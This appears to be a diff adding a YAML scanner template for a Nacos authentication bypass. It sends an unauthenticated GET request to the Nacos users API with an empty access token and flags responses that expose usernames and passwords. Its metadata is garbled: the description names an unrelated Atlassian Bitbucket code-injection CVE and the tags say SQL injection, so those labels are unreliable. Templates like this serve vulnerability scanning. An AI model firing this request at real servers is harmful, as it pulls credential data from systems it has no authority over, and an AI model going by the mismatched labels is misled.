@@ -1,0 +1,19 @@
+id: nacos-core-auth-enabled-bypass
+
+info:
+  name: Nacos core.auth.enabled 权限绕过
+  author: yoyo
+  severity: critical
+  verified: true
+  description: |-
+    atlassian-bitbucket-代码注入-CVE-2022-36804
+  tags: nacos,sqli
+  created: 2025/03/27
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken=
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+expression: r0()
